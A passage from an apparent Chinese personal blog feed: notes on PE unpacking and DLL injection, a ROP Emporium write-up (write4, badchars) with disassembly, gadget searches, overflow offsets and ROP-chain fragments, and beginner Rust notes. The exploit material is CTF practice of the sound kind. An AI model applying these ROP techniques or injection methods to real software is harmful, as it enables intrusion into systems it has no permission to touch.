<p>不让当前的数据流中断，不会让输入流关闭的指令，直接使用cat的功能为将输入流复制到输出流中。</p>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE 初探</title>
    <url>/2020/08/18/RCE%20%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><p>upx == 加壳？<br>代码压缩器，执行时解码后运行<br>PS  .\upx.exe -1 -o notepad_upx.exe D:\RCE\notepad.exe</p>
<a id="more"></a>
<hr>
<p>段寄存器 16 位<br>DS 存放数据段的段基址</p>
<hr>
<p>每一个<code>内存单元的宽度为8位</code>。<br>[编号]称为地址。<br>内存单元：字节 <code>每个字节有个编号</code>，称为<code>内存地址</code></p>
<hr>
<p>dword ptr [esi+13000]=[notepad.01014000]=14D L’ō’</p>
<p>ds 寄存器没用？</p>
<hr>
<p>在栈中设置硬件断点 找到解壳后的OEP<br>具体在<code>PUSHAD</code>中设置硬件断点，指令完成后才暂停 ，也就是<code>POPAD</code> 完成后暂停 ，后面JMP跳转到<code>OEP</code> original EP</p>
<hr>
<p>exe默认00400000<br>dll 默认10000000</p>
<hr>
<h4 id="节对齐"><a href="#节对齐" class="headerlink" title="节对齐"></a>节对齐</h4><p>Alignment is <code>a rounded up value.</code> Section data size is rounded up for effeciency because the OS moves stuff around in chunks anyway.<br>The File Alignment is usually 512 bytes which fit the blocksize of most filesystems.<br>The Section Alignment is usually 4096 bytes which fit the size of a memory page.<br>So if you have a PE-file with a section (like “.text”) that contains<code> 513</code> bytes of data:</p>
<p><code>不足的改为整数倍</code><br>Section .text will be rounded up to <code>1024</code> bytes on file.<br>Section .text will be rounded up to <code>4096 </code>bytes in memory.<br>Note the amount of slack space possible both on file and in memory.</p>
<hr>
<h4 id="stud-pe"><a href="#stud-pe" class="headerlink" title="stud_pe"></a>stud_pe</h4><p>修改size of optional header值，向文件头插入解码代码<br>在选项头和节区头间插入代码<br>numberofRVAandSIZES表示data_directory结构体元素个数(有些没用，可以覆盖)</p>
<h4 id="inline-patch-内嵌补丁"><a href="#inline-patch-内嵌补丁" class="headerlink" title="inline patch 内嵌补丁"></a>inline patch 内嵌补丁</h4><p>将补丁代码放在空白块中</p>
<hr>
<p>变量名和函数名只是地址的一种助记符，当源文件被编译和链接成可执行程序后，它们都会被替换成地址。</p>
<p>取地址符&amp;</p>
<p>.text 的 size of raw data == 400 virtual size == 280 文件中400 加载到内存中只加了280<br>其他值时0x00</p>
<hr>
<p>image_scn_men_write 相应内存区的写权限</p>
<hr>
<h4 id="rep-movsb-命令"><a href="#rep-movsb-命令" class="headerlink" title="rep movsb 命令"></a>rep movsb 命令</h4><p> b==byte rep == repeats ECX 里大小 循环</p>
<h4 id="moves-命令"><a href="#moves-命令" class="headerlink" title="moves  命令"></a>moves  命令</h4><p>== ds:esi -&gt; ds:edi<br>decreasing CX, so at the end CX becomes zero.</p>
<h4 id="RCE经验"><a href="#RCE经验" class="headerlink" title="RCE经验"></a>RCE经验</h4><p>1 压缩器解码<br>2 区域双重加密 内嵌补丁</p>
<hr>
<h4 id="test-按位与"><a href="#test-按位与" class="headerlink" title="test 按位与"></a>test 按位与</h4><p>test eax, eax<br>eax==0 zf 设位1</p>
<hr>
<h4 id="Ret相当于-Pop-EIP"><a href="#Ret相当于-Pop-EIP" class="headerlink" title="Ret相当于 Pop EIP"></a>Ret相当于 Pop EIP</h4><hr>
<h4 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h4><p>threadProc 线程创建函数<br>用句柄控制相应进程<br>三种方法：<br>创建远程线程<br>钩子注入<br>设置里全局注入</p>
<p>SPaCIoS</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>&lt;&lt;基本ROP_ropemporium 第三到四题</title>
    <url>/2021/01/15/ROP_ropemporium_%E7%AC%AC%E4%B8%89%E5%88%B0%E5%9B%9B%E9%A2%98/</url>
    <content><![CDATA[<p>ROP Emporium write4,badchars,fluff<br>write4和badchars都解出来了，fluff找不到有用的gadget<br>代码：<a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a></p>
<a id="more"></a>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>瞎搜找到的：<br><a href="https://github.com/abatchy17/ROP-Emporium">https://github.com/abatchy17/ROP-Emporium</a></p>
<ol>
<li>Get function names: <code>nm binary | grep &#39; t &#39;</code></li>
<li>Get GOT entries: <code>readelf --relocs binary</code></li>
<li>Get PLT entries: <code>objdump -M intel -dj .plt binary</code></li>
<li>Get strings: <code>strings</code> binary or the much better alternative <code>rabin2 -z binary</code></li>
<li>Virtual address space layout: <code>vmmap </code>in PEDA after starting program, otherwise other modules aren’t mapped yet.</li>
</ol>
<h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>当前指令地址<code>PC</code></p>
<pre><code>objdump -s
objdump -R 
objdump --section=.plt -d ./write432 //查看plt</code></pre>
<p>./write432:     file format elf32-i386</p>
<pre><code>Disassembly of section .plt:

080483a0 &lt;.plt&gt;:
 80483a0:    ff 35 04 a0 04 08        pushl  0x804a004
 80483a6:    ff 25 08 a0 04 08        jmp    *0x804a008
 80483ac:    00 00                    add    %al,(%eax)
    ...

080483b0 &lt;pwnme@plt&gt;:
 80483b0:    ff 25 0c a0 04 08        jmp    *0x804a00c
 80483b6:    68 00 00 00 00           push   $0x0
 80483bb:    e9 e0 ff ff ff           jmp    80483a0 &lt;.plt&gt;

080483c0 &lt;__libc_start_main@plt&gt;:
 80483c0:    ff 25 10 a0 04 08        jmp    *0x804a010
 80483c6:    68 08 00 00 00           push   $0x8
 80483cb:    e9 d0 ff ff ff           jmp    80483a0 &lt;.plt&gt;

080483d0 &lt;print_file@plt&gt;:
 80483d0:    ff 25 14 a0 04 08        jmp    *0x804a014
 80483d6:    68 10 00 00 00           push   $0x10
 80483db:    e9 c0 ff ff ff           jmp    80483a0 &lt;.plt&gt;</code></pre>
<p><code>objdump -j .plt -d ./write432</code>命令效果一样</p>
<pre><code>ROPgadget --binary ./write432 --only &#39;mov|ret&#39;
ROPgadget --binary ./write432 --only &#39;mov|ret&#39; | grep ebx</code></pre>
<p><strong>要点：</strong>print_file参数是一个地址，所以不能用字符串</p>
<pre><code>0x00001018    0x8 0x0804a018    0x8 -rw- .data</code></pre>
<p>我选择把字符串放到data段上。</p>
<pre><code>dataaddress=p32(0x0804a018)
data1=b&#39;flag&#39;
data2=b&#39;.txt&#39;</code></pre>
<p>第一次我数据没有分开，ebp只有32位，一次只能传4字节，我第一次竟然没有认识到</p>
<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><pre><code>│           0x0040061b      bfb4064000     mov edi, str.nonexistent    ; 0x4006b4 ; &quot;nonexistent&quot;
│           0x00400620      e8ebfeffff     call sym.imp.print_file</code></pre>
<p>参数传到RDI<br>    #0x0000000000400628 : mov qword ptr [r14], r15 ; ret<br>    #0x0000000000400690 : pop r14 ; pop r15 ; ret<br>    #0x0000000000400693 : pop rdi ; ret</p>
<pre><code>gadget=popret+dataaddress+data+movret
gadget+=popret1+dataaddress
gadget+=printfile</code></pre>
<h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h3><p> Badchars are the reason that encoders such as shikata-ga-nai exist.<br>这里，会将badchars替换为<code>0xeb</code></p>
<p><em>IDA永远的神</em><br>反编译</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">36</span>]; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, v4, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">-21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><p><code>man 7 ascii</code><br>查看ascii表</p>
<p><code>ropper --file ./badchars32 -b 6167782e</code><br>ropper排除badchars是这样用的，ROPgadget也是一样的</p>
<p>gdb_peda: <code>查看溢出点</code></p>
<pre><code>gdb-peda$ pattern_create 100
gdb-peda$ pattern_offset AFAA
AFAA found at offset: 44</code></pre>
<p><code>pwndbg&gt; rop --grep xor -- --badbytes 6167782e --ropchain --nojop</code></p>
<h3 id="寄存器解析"><a href="#寄存器解析" class="headerlink" title="寄存器解析"></a>寄存器解析</h3><p>bl is the name of the low 8 bits (bits 7-0) in the ebx register. There is also bh which is the bits 15-8 of ebx, and bx is the low 16 bits (bits 15-0). There is no name for the higher 16 bits.</p>
<p>This applies to all of the registers eax, ebx, ecx and edx.<br>搞错了，bl不是ebp中，而是ebx<br><a href="https://blog.csdn.net/ww506772362/article/details/75530723">https://blog.csdn.net/ww506772362/article/details/75530723</a></p>
<p>疑问：<br>我第一次传xor 参数ebx 的时候是00 00 00 8a , 放在栈中是00 00 00 8a , pop ebx , 是倒取读入?<br>所以是8a 00 00 00</p>
<p>EBP: 0x41304141 (‘AA0A’)</p>
<h3 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h3><h3 id="r14b"><a href="#r14b" class="headerlink" title="r14b"></a>r14b</h3><p>r14 r14d r14w r14b<br>有个坑<br>x的位置刚好是2e会被替换</p>
<p><code>Failed to open file: flag.t\xebt</code></p>
<p>目前没有找到可以用的gadget</p>
<h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>同样没有有用的gadget<br>mov [e?x],<br>xchg  [ecx],dl<br>pext edx, ebx, eax</p>
<p>pext 解析<br><a href="https://blog.csdn.net/qq_43401808/article/details/86540472">https://blog.csdn.net/qq_43401808/article/details/86540472</a></p>
<p>这条命令能用，但是没有<code>pop eax</code></p>
]]></content>
      <categories>
        <category>rop_emporium</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>RUST学习1</title>
    <url>/2020/07/27/RUST%E5%AD%A6%E4%B9%A01/</url>
    <content><![CDATA[<h3 id="运行命令"><a href="#运行命令" class="headerlink" title="运行命令"></a>运行命令</h3><p><code>cargo doc --open</code><br><code>rustup doc</code><br><code>cargo new --vcs=git</code><br><code>cargo build</code><br><code>cargo run </code><br><code>cargo check </code>更快编译，但不生成可执行文件<br><code>cargo build --release</code> 生成的执行文件运行更快<br>benchmark基准测试</p>
<a id="more"></a>
<p>Variables and Mutability<br>mutable 易变的</p>
<p>let mut x=5</p>
<h6 id="rust默认变量不可变"><a href="#rust默认变量不可变" class="headerlink" title="rust默认变量不可变"></a>rust默认变量不可变</h6><p>fn main() {<br>const MAX_POINTS: u32 = 100_000;<br>}<br>const 整个运行时间都存在</p>
<p>fn main() {<br>    let spaces = “   “;<br>    let spaces = spaces.len();<br>}</p>
<h3 id="Data-Types"><a href="#Data-Types" class="headerlink" title="Data Types"></a>Data Types</h3><p>interger 默认i32<br>float 默认 f64<br>char ‘’ 4字节*Accented letters; Chinese, Japanese, and Korean characters; emoji; and zero-width spaces are all valid char values in Rust. *<br>string “”</p>
<p>tuple 元组 固定 类型可以不同</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let tup: (i32, f64, u8) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let x: (i32, f64, u8) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let five_hundred = x<span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">    let six_point_four = x<span class="number">.1</span>;</span><br><span class="line"></span><br><span class="line">    let one = x<span class="number">.2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>array 数组 类型相同 固定 存在栈中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> months = [<span class="string">&quot;January&quot;</span>, <span class="string">&quot;February&quot;</span>, <span class="string">&quot;March&quot;</span>, <span class="string">&quot;April&quot;</span>, <span class="string">&quot;May&quot;</span>, <span class="string">&quot;June&quot;</span>, <span class="string">&quot;July&quot;</span>,</span><br><span class="line">              <span class="string">&quot;August&quot;</span>, <span class="string">&quot;September&quot;</span>, <span class="string">&quot;October&quot;</span>, <span class="string">&quot;November&quot;</span>, <span class="string">&quot;December&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> a: [i32; <span class="number">5</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">3</span>; <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> first = a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>

<p>rust会检查索引跃出</p>
<p>vector 不固定</p>
<h3 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h3><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    another_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn another_function() &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;Another function.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Rust<code>doesn’t care</code>where you define your functions, only that they’re defined somewhere.</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    another_function(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn another_function(x: i32, y: i32) &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>必须声明参数类型</p>
<hr>
<p><code>Statements</code>are instructions that perform some action and do not return a value.<br>let y = 6; 无返回值不能赋给其他变量<br><code>Expressions</code> evaluate to a resulting value.</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> y = &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="number">3</span>;</span><br><span class="line">        x + <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> Note the x + 1 line without a semicolon at the end, which is unlike most of the lines you’ve seen so far. <strong>Expressions do not include ending semicolons.</strong> If you add a semicolon to the end of an expression, you turn it into a statement, which will then not return a value.</p>
<p>返回值</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn five() -&gt; i32 &#123;</span><br><span class="line">    <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = five();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = plus_one(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn plus_one(x: i32) -&gt; i32 &#123;</span><br><span class="line">    x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h5><p>//</p>
<h3 id="control"><a href="#control" class="headerlink" title="control"></a>control</h3><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number &lt; <span class="number">5</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;condition was true&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;condition was false&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> Rust will <strong>not</strong> automatically try to <strong>convert non-Boolean types to a Boolean</strong></p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;number is divisible by 4&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;number is divisible by 3&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;number is divisible by 2&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;number is not divisible by 4, 3, or 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> condition = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="keyword">if</span> condition &#123; <span class="number">5</span> &#125; <span class="keyword">else</span> &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of number is: &#123;&#125;&quot;</span>, number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h5><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    loop &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;again!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> mut counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> result = loop &#123;</span><br><span class="line">        counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">10</span> &#123;</span><br><span class="line">            <span class="keyword">break</span> counter * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The result is &#123;&#125;&quot;</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="while"><a href="#while" class="headerlink" title="while"></a>while</h6><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> mut number = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> number != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;&#123;&#125;!&quot;</span>, number);</span><br><span class="line"></span><br><span class="line">        number -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;LIFTOFF!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="for"><a href="#for" class="headerlink" title="for"></a>for</h6><p> use a for loop and execute some code for each item in a collection</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> a.iter() &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;the value is: &#123;&#125;&quot;</span>, element);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">4</span>).rev() &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;&#123;&#125;!&quot;</span>, number);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;LIFTOFF!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>rev, to reverse the range</code></p>
<h3 id="guess-game-example"><a href="#guess-game-example" class="headerlink" title="guess game . example"></a>guess game . example</h3><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println</span>!(<span class="string">&quot;x = &#123;&#125; and y = &#123;&#125;&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>cargo doc --open</code></p>
<p>The** trim **method on a String instance will eliminate any whitespace at the beginning and end<br>5\n 变成 5<br>The **parse **method on strings parses a string into some kind of number. </p>
<p>cargo fmt 自动调整格式<br><a href="https://github.com/rust-lang/rustfmt">https://github.com/rust-lang/rustfmt</a></p>
]]></content>
      <tags>
        <tag>RUST</tag>
      </tags>
  </entry>
  <entry>
    <title>RUST学习2</title>
    <url>/2020/07/29/RUST%E5%AD%A6%E4%B9%A02/</url>
    <content><![CDATA[<h3 id="rust"><a href="#rust" class="headerlink" title="rust"></a>rust</h3><p>All data <code>stored on the stack must have a known, fixed size. </code>Data with an unknown size at compile time or a size that might change must be stored on the heap instead.</p>
<p>Pushing to<code> the stack is faster than allocating on the heap</code> because the allocator never has to search for a place to store new data; </p>
<a id="more"></a>
<h3 id="Ownership-Rules"><a href="#Ownership-Rules" class="headerlink" title="Ownership Rules"></a>Ownership Rules</h3><p>解决堆上数据 的问题</p>
<p>Each value in Rust has a variable that’s called its owner.<br>There can only <code>be one owner at a time.</code><br>When the <code>owner goes out of scope, </code>the value will be dropped. <code>从堆中回收</code></p>
<p>string 存在scope中</p>
<p>the concept of copying the pointer, length, and capacity without copying the data probably sounds like making a shallow copy. </p>
<p>rust</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">let s1 = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">  <span class="params">|         -- move occurs because `s1` has type `std::string::String`, which does <span class="keyword">not</span> implement the `Copy` trait</span></span><br><span class="line"><span class="params">3 |</span>     let s2 = s1;</span><br><span class="line">  <span class="params">|              -- value moved here</span></span><br></pre></td></tr></table></figure>
<p>s1 无效 回收只s2</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    let s2 = s1.clone();</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;s1 = &#123;&#125;, s2 = &#123;&#125;&quot;</span>, s1, s2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">x=<span class="number">5</span></span><br><span class="line">y=x</span><br></pre></td></tr></table></figure>
<p><code>栈中不用clone</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let s = String::from(<span class="string">&quot;hello&quot;</span>);  <span class="regexp">//</span> s comes into scope</span><br><span class="line"></span><br><span class="line">    takes_ownership(s);             <span class="regexp">//</span> s<span class="string">&#x27;s value moves into the function...</span></span><br><span class="line"><span class="string">                                    // ... and so is no longer valid here</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let x = 5;                      // x comes into scope</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    makes_copy(x);                  // x would move into the function,</span></span><br><span class="line"><span class="string">                                    // but i32 is Copy, so it’s okay to still</span></span><br><span class="line"><span class="string">                                    // use x afterward</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; // Here, x goes out of scope, then s. But because s&#x27;</span>s value was moved, nothing</span><br><span class="line">  /<span class="regexp">/ special happens.</span></span><br></pre></td></tr></table></figure>

<h3 id="References-and-Borrowing"><a href="#References-and-Borrowing" class="headerlink" title="References and Borrowing"></a>References and Borrowing</h3><p>引用 不拿所有权 也称借</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    change(&amp;mut s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn change(<span class="symbol">some_string:</span> &amp;mut String) &#123;</span><br><span class="line">    some_string.push_str(<span class="string">&quot;, world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>一个可变变量只能引用一次 </code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        let r1 = &amp;mut s;</span><br><span class="line">    &#125; /<span class="regexp">/ r1 goes out of scope here, so we can make a new reference with no problems.</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    let r2 = &amp;mut s;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>用花括号创建一个空间，来引用，</p>
